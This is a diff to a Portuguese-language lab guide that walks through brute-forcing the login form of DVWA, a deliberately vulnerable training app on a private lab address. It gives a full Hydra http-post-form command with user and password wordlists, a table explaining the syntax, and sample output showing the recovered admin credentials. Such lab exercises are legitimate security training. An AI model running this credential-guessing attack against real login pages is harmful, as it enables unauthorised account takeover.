@@ -208,7 +208,7 @@ ftp 192.168.1.114
 A DVWA (Damn Vulnerable Web Application) possui uma página de login ideal para testar ataques a formulários.
 
 ### Preparação
-1. Acesse a DVWA pelo navegador: `http://192.168.56.20/dvwa`
+1. Acesse a DVWA pelo navegador: `http://192.168.1.114/dvwa/login.php`
 2. Faça login inicial (`admin` / `password`)
 3. Em **DVWA Security**, defina o nível como **Low** para o exercício
 4. Vá até o módulo **Brute Force**
@@ -222,34 +222,35 @@ Use o **DevTools (F12) → aba Network** para inspecionar a requisição de logi
 - A **mensagem de erro** exibida em falha (ex.: *"Username and/or password incorrect."*)
 - O **cookie de sessão** (`PHPSESSID`) e o nível de segurança (`security=low`)
 
-### Ataque com Hydra (módulo `http-get-form`)
+### Ataque com Hydra (módulo `http-post-form`)
 ```bash
-hydra 192.168.56.20 http-get-form \
-  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect:H=Cookie: PHPSESSID=SEU_SESSID; security=low" \
-  -l admin -P wordlists/senhas.txt
+hydra 192.168.1.114 http-post-form \
+    -L usuarios.txt -P senhas.txt \
+    "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
 ```
 
 Entendendo a sintaxe do módulo (separada por `:`):
 
 | Parte | Significado |
 |---|---|
-| `/dvwa/vulnerabilities/brute/` | Caminho da página de login |
+| `/dvwa/login.php` | Caminho da página de login |
 | `username=^USER^&password=^PASS^&Login=Login` | Parâmetros do formulário; `^USER^` e `^PASS^` são substituídos pelas listas |
-| `incorrect` | Texto que indica **falha** (se aparecer, a senha está errada) |
-| `H=Cookie: PHPSESSID=...; security=low` | Cabeçalho com o cookie de sessão válido e o nível de segurança |
+| `Login failed` | Texto que indica **falha** (se aparecer, a senha está errada) |
+
 
 Demais parâmetros:
-- `-l admin` usuário único (use `-L usuarios.txt` para uma lista)
-- `-P wordlists/senhas.txt` lista de senhas
+- `-L usuarios.txt` lista de usuarios)
+- `-P senhas.txt` lista de senhas
 
-> ℹ️ Pegue o valor real do `PHPSESSID` no DevTools após fazer login na DVWA e substitua `SEU_SESSID`. Se o formulário usar **POST**, troque o módulo por `http-post-form` mantendo a mesma estrutura.
 
 **Saída esperada (exemplo):**
 ```
-[80][http-get-form] host: 192.168.56.20   login: admin   password: password
+[80][http-post-form] host: 192.168.1.114   login: admin   password: password
+
 ```
 
-📸 *`/images/04-dvwa-hydra.png`*
+<img width="1606" height="400" alt="05 -dvwa-hydra" src="https://github.com/user-attachments/assets/047737b0-2e3a-4066-9578-7effae3cc112" />
+
 
 ---
 
